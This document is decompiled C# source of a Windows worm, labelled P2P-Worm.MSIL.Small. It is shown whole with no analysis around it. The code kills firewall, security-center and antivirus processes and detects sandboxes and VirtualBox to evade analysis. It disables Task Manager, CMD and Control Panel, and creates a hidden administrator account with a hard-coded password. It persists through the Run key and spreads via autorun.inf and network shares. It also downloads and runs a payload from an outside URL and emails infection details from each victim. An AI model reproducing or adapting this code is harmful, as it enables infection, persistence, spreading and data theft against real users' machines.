// Decompiled with JetBrains decompiler
// Type: Source
// Assembly: worm, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8EC03A9B-2208-4FEE-92A0-7A52F1587AD3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\P2P-Worm.MSIL.Small.u-db4920b710fe27301d242a61910da03b239972d96a018370dcf7d2a5187b33cd.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[StandardModule]
internal sealed class Source
{
  private static string hxea8 = Path.GetTempPath() + "\\yIjUsWbVePcXxK.exe";
  private static string path = Path.GetTempPath();
  private static string w7tu;
  private static string[] qktto;
  private static string nyr67 = "http://hfmixed.fileave.com/Newtest.exe";
  private static string jicyn;
  private static StreamWriter w58n9 = new StreamWriter(Source.path + "\\melt.bat");
  private static string[] r2p3z;
  private static string od3u = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
  public static string urzsu = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
  private static FileAttributes ql19j = FileAttributes.Hidden;
  private static string bb6z = Interaction.Environ("AppData") + "\\yIjUsWbVePcXxK.exe";
  private static RegistryKey vx6yi;
  private static string p0702 = (string) Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Universal", "Universal", (object) "Universal");
  private static RegistryKey ss2wr = Registry.LocalMachine.OpenSubKey("Software", true);
  private static RegistryKey n4md4 = Source.ss2wr.CreateSubKey("Universal");
  private static DirectoryEntry tz97v = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
  private static DirectoryEntry x5z0v = Source.tz97v.Children.Add("Universal", "user");
  private static string c2cx = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
  private static ManagementObjectSearcher zib26 = new ManagementObjectSearcher("select * from win32_share");
  private static DirectoryEntry vzkmj;
  private static string uv92s = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
  private static RegistryKey nw5vo = Registry.CurrentUser.OpenSubKey(Source.uv92s);
  private static ManagementClass managementClass = new ManagementClass("Win32_Share");
  private static ManagementBaseObject inParams = Source.managementClass.GetMethodParameters("Create");
  private static ManagementBaseObject outParams;

  [STAThread]
  public static void Main()
  {
label_0:
    int num1;
    int num2;
    try
    {
      int num3 = 1;
      byte num4 = 1;
label_1:
      num3 = 2;
      byte num5 = 1;
label_2:
      num3 = 3;
      byte num6 = 1;
label_3:
      num3 = 4;
      byte num7 = 0;
label_4:
      num3 = 5;
      byte num8 = 0;
label_5:
      num3 = 6;
      byte num9 = 0;
label_6:
      num3 = 7;
      byte num10 = 0;
label_7:
      num3 = 8;
      byte num11 = 0;
label_8:
      num3 = 9;
      byte num12 = 0;
label_9:
      num3 = 10;
      byte num13 = 1;
label_10:
      num3 = 11;
      byte num14 = 0;
label_11:
      num3 = 12;
      byte num15 = 0;
label_12:
      num3 = 13;
      byte num16 = 0;
label_13:
      num3 = 14;
      byte num17 = 0;
label_14:
      num3 = 15;
      byte num18 = 0;
label_15:
      num3 = 16;
      byte num19 = 0;
label_16:
      num3 = 17;
      byte num20 = 0;
label_17:
      num3 = 18;
      byte num21 = 0;
label_18:
      num3 = 19;
      byte num22 = 0;
label_19:
      num3 = 20;
      byte num23 = 0;
label_20:
      num3 = 21;
      if (num19 != (byte) 1)
        goto label_22;
label_21:
      num3 = 22;
      Source.dud98();
label_22:
      num3 = 24;
      if (num20 != (byte) 1)
        goto label_24;
label_23:
      num3 = 25;
      Source.jmyz();
label_24:
      num3 = 27;
      if (num8 != (byte) 1)
        goto label_26;
label_25:
      num3 = 28;
      Source.dlf68();
label_26:
      num3 = 30;
      if (num4 != (byte) 1)
        goto label_28;
label_27:
      num3 = 31;
      Source.pv781();
label_28:
      num3 = 33;
      if (num6 != (byte) 1)
        goto label_31;
label_29:
      ProjectData.ClearProjectError();
      num1 = 1;
label_30:
      num3 = 35;
      msekn.xnqfi("yIjUsWbVePcXxK.exe");
label_31:
      num3 = 37;
      if (num13 != (byte) 1)
        goto label_35;
label_32:
      num3 = 38;
      Source.yygwu();
label_33:
      num3 = 39;
      Source.zl7hc("C:\\Program Settings", "Program Settings");
label_34:
      num3 = 40;
      Source.rijf();
label_35:
      num3 = 42;
      if (num11 != (byte) 1)
        goto label_37;
label_36:
      num3 = 43;
      Source.sfywm();
label_37:
      num3 = 45;
      if (num16 != (byte) 1)
        goto label_39;
label_38:
      num3 = 46;
      Source.vgauy();
label_39:
      num3 = 48;
      if (num9 != (byte) 1)
        goto label_41;
label_40:
      num3 = 49;
      Source.d5zuk();
label_41:
      num3 = 51;
      if (num18 != (byte) 1)
        goto label_43;
label_42:
      num3 = 52;
      Source.tgzsf();
label_43:
      num3 = 54;
      if (num15 != (byte) 1)
        goto label_45;
label_44:
      num3 = 55;
      Source.juef();
label_45:
      num3 = 57;
      if (num7 != (byte) 1)
        goto label_47;
label_46:
      num3 = 58;
      Source.bo2y();
label_47:
      num3 = 60;
      if (num17 != (byte) 1)
        goto label_49;
label_48:
      num3 = 61;
      Source.w6aak();
label_49:
      num3 = 63;
      if (num14 != (byte) 1)
        goto label_51;
label_50:
      num3 = 64;
      Source.avuur();
label_51:
      num3 = 66;
      if (num21 != (byte) 1)
        goto label_53;
label_52:
      num3 = 67;
      Source.uqd84();
label_53:
      num3 = 69;
      if (num22 != (byte) 1)
        goto label_55;
label_54:
      num3 = 70;
      Source.lerbr();
label_55:
      num3 = 72;
      Source.fnl7s();
label_56:
      num3 = 73;
      Source.af9yy();
label_57:
      num3 = 74;
      Source.k7u00();
label_58:
      num3 = 75;
      if (num23 != (byte) 1)
        goto label_60;
label_59:
      num3 = 76;
      Source.q0fr5();
label_60:
      num3 = 78;
      if (num12 != (byte) 1)
        goto label_62;
label_61:
      num3 = 79;
      Source.w8cni();
label_62:
      num3 = 81;
      if (num5 != (byte) 1)
        goto label_64;
label_63:
      num3 = 82;
      Source.s8u9n();
label_64:
      num3 = 84;
      if (num10 != (byte) 1)
        goto label_72;
label_65:
      num3 = 85;
      Source.fmhx7();
      goto label_72;
label_67:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num24 = num2 + 1;
          num2 = 0;
          switch (num24)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
            case 12:
              goto label_11;
            case 13:
              goto label_12;
            case 14:
              goto label_13;
            case 15:
              goto label_14;
            case 16:
              goto label_15;
            case 17:
              goto label_16;
            case 18:
              goto label_17;
            case 19:
              goto label_18;
            case 20:
              goto label_19;
            case 21:
              goto label_20;
            case 22:
              goto label_21;
            case 23:
            case 24:
              goto label_22;
            case 25:
              goto label_23;
            case 26:
            case 27:
              goto label_24;
            case 28:
              goto label_25;
            case 29:
            case 30:
              goto label_26;
            case 31:
              goto label_27;
            case 32:
            case 33:
              goto label_28;
            case 34:
              goto label_29;
            case 35:
              goto label_30;
            case 36:
            case 37:
              goto label_31;
            case 38:
              goto label_32;
            case 39:
              goto label_33;
            case 40:
              goto label_34;
            case 41:
            case 42:
              goto label_35;
            case 43:
              goto label_36;
            case 44:
            case 45:
              goto label_37;
            case 46:
              goto label_38;
            case 47:
            case 48:
              goto label_39;
            case 49:
              goto label_40;
            case 50:
            case 51:
              goto label_41;
            case 52:
              goto label_42;
            case 53:
            case 54:
              goto label_43;
            case 55:
              goto label_44;
            case 56:
            case 57:
              goto label_45;
            case 58:
              goto label_46;
            case 59:
            case 60:
              goto label_47;
            case 61:
              goto label_48;
            case 62:
            case 63:
              goto label_49;
            case 64:
              goto label_50;
            case 65:
            case 66:
              goto label_51;
            case 67:
              goto label_52;
            case 68:
            case 69:
              goto label_53;
            case 70:
              goto label_54;
            case 71:
            case 72:
              goto label_55;
            case 73:
              goto label_56;
            case 74:
              goto label_57;
            case 75:
              goto label_58;
            case 76:
              goto label_59;
            case 77:
            case 78:
              goto label_60;
            case 79:
              goto label_61;
            case 80:
            case 81:
              goto label_62;
            case 82:
              goto label_63;
            case 83:
            case 84:
              goto label_64;
            case 85:
              goto label_65;
            case 86:
            case 87:
              goto label_72;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_67;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_72:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static void fmhx7()
  {
    Source.wj9v5();
    Source.it1gc();
    Source.sjbxk();
    Source.rd0w5();
    Source.y4uzq();
    Source.h5aar();
    Source.obmte();
    Source.j0mk();
    ProjectData.EndApp();
  }

  private static void avuur()
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\\\hosts");
      streamWriter.Write("gF513jdmId otQJXuk1R8");
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write("tAeVbBzt4H fXcWCfgUwv");
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write("H0B5FHt3rV nkpH74JPKn");
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write("AvjYSZZcBA r6JM5CnAG5");
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write("iTzB32J9eB GEMm75NM7E");
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write("IJZ1uIjU9K QIHfKBhLDu");
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write("bLblRgjFUd il4ax9Nhry");
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write("w9GYMsTWnO kOL45xDCo7");
      streamWriter.Write(Environment.NewLine);
      streamWriter.Dispose();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private static void dlf68()
  {
    Interaction.Shell("sc stop wscsvc", AppWinStyle.Hide);
    Interaction.Shell("sc stop SharedAccess", AppWinStyle.Hide);
  }

  private static void w8cni()
  {
    string end = new StreamReader(((HttpWebResponse) ((HttpWebRequest) WebRequest.Create("http://automation.whatismyip.com/n09230945.asp")).GetResponse()).GetResponseStream()).ReadToEnd();
    string hostName = Dns.GetHostName();
    new SmtpClient("smtp.gmail.com")
    {
      Port = 587,
      Credentials = ((ICredentialsByHost) new NetworkCredential("emailherelolz", "passwordxd")),
      EnableSsl = true
    }.Send(new MailMessage()
    {
      From = new MailAddress("emailherelolz"),
      To = {
        "emailherelolz"
      },
      Subject = "New Infection!",
      Body = "New Infection! The Info Can Be Found Below: " + hostName + " | " + end
    });
  }

  private static void lerbr()
  {
    Source.an7n0();
    Source.px1d9();
    Source.hm05m();
  }

  private static void q0fr5()
  {
    Source.bw928();
    Source.ixwtf();
    Source.g49hb();
  }

  private static void h5aar() => Source.w58n9.Close();

  private static void wj9v5() => Source.w58n9.WriteLine("@echo off");

  private static void b2i7g() => Source.r2p3z = Directory.GetLogicalDrives();

  private static void f6ceo() => s6RS9hUNMV.z4Fy2OIBQ3();

  private static void rgt2d() => s6RS9hUNMV.lgVM02aECe();

  private static void vgauy() => Interaction.Shell("REG add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.Hide);

  private static void dz2n2() => s6RS9hUNMV.D9F7l2pHXw();

  private static void y4uzq() => Source.w58n9.Flush();

  private static void it1gc() => Source.w58n9.WriteLine("TASKKILL /F /T /IM " + Application.ProductName);

  private static void juef()
  {
    RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    subKey.SetValue("DisableTaskMgr", (object) 1);
    subKey.Close();
  }

  private static void rd0w5() => Source.w58n9.WriteLine("del melt.bat");

  private static void ixwtf() => System.IO.File.SetAttributes(Source.bb6z, Source.ql19j);

  private static void r0ipq() => s6RS9hUNMV.tWEuPFDShv();

  private static void tgzsf() => Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);

  private static void s3v2n() => s6RS9hUNMV.HfwdgTHYEb();

  private static void a33ew() => MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);

  private static void j0mk() => Interaction.Shell("melt.bat");

  private static void hm05m() => Source.vx6yi.Close();

  private static void px1d9() => Source.vx6yi.DeleteSubKey("MSCONFIG.EXE", true);

  private static void lym4u() => Microsoft.VisualBasic.FileSystem.SetAttr(Source.jicyn + "HDDFile.com", FileAttribute.Hidden);

  private static void af9yy() => MyProject.Computer.Network.DownloadFile(Source.nyr67, Source.hxea8);

  private static void k0hiq() => Source.outParams = Source.managementClass.InvokeMethod("Create", Source.inParams, (InvokeMethodOptions) null);

  private static void w6aak() => Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);

  private static void g49hb() => MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("1" + Application.ProductName, (object) Source.bb6z);

  private static void bw928() => System.IO.File.Copy(Application.ExecutablePath, Source.bb6z);

  private static void fnl7s()
  {
    if (!System.IO.File.Exists(Path.GetTempPath() + "\\yIjUsWbVePcXxK.exe"))
      return;
    ProjectData.EndApp();
  }

  private static void qa0jm() => Registry.SetValue(Source.c2cx, "Universal", (object) 0, RegistryValueKind.DWord);

  private static void fdzct() => Source.vzkmj.Invoke("Add", (object) Source.x5z0v.Path.ToString());

  private static void e9m81() => Source.vzkmj = Source.tz97v.Children.Find("Administrators", "group");

  private static void bi7mc() => Source.x5z0v.CommitChanges();

  private static void ocfhh() => Source.x5z0v.Invoke("SetPassword", (object) "Universalwashere");

  private static void fiyqy() => MyProject.Computer.Network.DownloadFile(Source.nyr67, Source.hxea8);

  private static void cnzrb() => Microsoft.VisualBasic.FileSystem.SetAttr(Source.jicyn + "autorun.inf", FileAttribute.Hidden);

  private static void mi3aq() => MyProject.Computer.FileSystem.WriteAllText(Source.jicyn + "autorun.inf", "[autorun]\r\nopen=" + Source.jicyn + "HDDFile.com\r\nshellexecute=" + Source.jicyn, true);

  private static void ofy9k() => MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Source.jicyn + "HDDFile.com", (UIOption) -1, UICancelOption.DoNothing);

  private static void obmte() => Interaction.Shell(Application.StartupPath + "\\melt.bat", AppWinStyle.Hide);

  private static void sjbxk() => Source.w58n9.WriteLine("del " + Strings.Replace(Application.ExecutablePath, Application.StartupPath + "\\", ""));

  private static void k7u00() => Process.Start(Source.hxea8);

  private static void an7n0() => Source.vx6yi = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths", true);

  public static void sfywm()
  {
    Process[] processesByName = Process.GetProcessesByName("iptray");
    int index = 0;
    while (index < processesByName.Length)
    {
      processesByName[index].Kill();
      checked { ++index; }
    }
  }

  public static void uqd84()
  {
    Process[] processesByName = Process.GetProcessesByName("kQRbVmmhvigBONo");
    int index = 0;
    while (index < processesByName.Length)
    {
      processesByName[index].Kill();
      ProjectData.EndApp();
      checked { ++index; }
    }
  }

  public static void d5zuk()
  {
    Process[] processesByName = Process.GetProcessesByName("cfp");
    int index = 0;
    while (index < processesByName.Length)
    {
      processesByName[index].Kill();
      checked { ++index; }
    }
  }

  public static void jmyz()
  {
    Process[] processesByName = Process.GetProcessesByName("VBoxTray");
    int index = 0;
    while (index < processesByName.Length)
    {
      Process process = processesByName[index];
      int num = (int) MessageBox.Show("This Program Has Known Compaitablility Issues In VirtualBox. Please Run It Normally. The Application Will Now Close. Thankyou.", "Error");
      ProjectData.EndApp();
      checked { ++index; }
    }
  }

  public static void bo2y()
  {
    Process[] processesByName = Process.GetProcessesByName("SpybotSD");
    int index = 0;
    while (index < processesByName.Length)
    {
      processesByName[index].Kill();
      checked { ++index; }
    }
  }

  public static void dud98()
  {
    Process[] processesByName = Process.GetProcessesByName("SandboxieRpcSs");
    int index = 0;
    while (index < processesByName.Length)
    {
      Process process = processesByName[index];
      int num = (int) MessageBox.Show("This Program Has Known Compaitablility Issues In Sandboxie. Please Run It Normally. The Application Will Now Close. Thankyou.", "Error");
      ProjectData.EndApp();
      checked { ++index; }
    }
  }

  private static void pv781()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      Source.a33ew();
label_2:
      num3 = 3;
      Source.b2i7g();
label_3:
      num3 = 4;
      string[] r2p3z = Source.r2p3z;
      int index = 0;
      goto label_13;
label_5:
      num3 = 5;
      if (Source.od3u.Contains(Source.jicyn))
        goto label_11;
label_6:
      num3 = 7;
label_7:
      num3 = 8;
      Source.ofy9k();
label_8:
      num3 = 9;
      Source.mi3aq();
label_9:
      num3 = 10;
      Source.lym4u();
label_10:
      num3 = 11;
      Source.cnzrb();
label_11:
      checked { ++index; }
label_12:
      num3 = 13;
label_13:
      if (index < r2p3z.Length)
      {
        Source.jicyn = r2p3z[index];
        goto label_5;
      }
      else
        goto label_20;
label_15:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_5;
            case 6:
            case 12:
              goto label_11;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
            case 13:
              goto label_12;
            case 14:
              goto label_20;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_15;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_20:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static void s8u9n()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      Source.rgt2d();
label_2:
      num3 = 3;
      Source.dz2n2();
label_3:
      num3 = 4;
      Source.f6ceo();
label_4:
      num3 = 5;
      Source.s3v2n();
label_5:
      num3 = 6;
      Source.r0ipq();
      goto label_12;
label_7:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_12;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_7;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_12:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static bool qkoo()
  {
    if (Operators.CompareString(Source.p0702, "Universal", false) == 0)
      return true;
    Source.n4md4.SetValue("Universal", (object) Source.urzsu);
    return false;
  }

  public static void yygwu()
  {
    try
    {
      Source.ocfhh();
      Source.bi7mc();
      Source.e9m81();
      if (Source.vzkmj != null)
        Source.fdzct();
      try
      {
        Source.qa0jm();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void rijf()
  {
    try
    {
      try
      {
        foreach (ManagementBaseObject managementBaseObject in Source.zib26.Get())
        {
          string str = Convert.ToString(RuntimeHelpers.GetObjectValue(managementBaseObject["Name"]));
          if (!str.Contains("$"))
            System.IO.File.Copy(Source.urzsu, "\\\\" + Environment.MachineName + "\\" + str + "\\j2eBE.exe", true);
        }
      }
      finally
      {
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        objectEnumerator?.Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      string[] valueNames = Source.nw5vo.GetValueNames();
      int index = 0;
      while (index < valueNames.Length)
      {
        string name = valueNames[index];
        string str = Source.nw5vo.GetValue(name).ToString();
        if (Operators.CompareString(name.ToLower(), "mrulist", false) != 0)
        {
          try
          {
            System.IO.File.Copy(Source.urzsu, str + "\\\\j2eBE.exe", true);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        checked { ++index; }
      }
      Source.nw5vo.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void zl7hc(string piw25, string n0wpg)
  {
    try
    {
      Directory.CreateDirectory(piw25);
      Source.inParams["Description"] = (object) n0wpg;
      Source.inParams["Name"] = (object) n0wpg;
      Source.inParams["Path"] = (object) Microsoft.VisualBasic.FileSystem.Dir();
      Source.inParams["Type"] = (object) 0;
      Source.k0hiq();
      if (Conversions.ToUInteger(Source.outParams.Properties["ReturnValue"].Value) != 0U || !Directory.Exists(piw25))
        return;
      new DirectoryInfo(piw25).Attributes = FileAttributes.Hidden;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
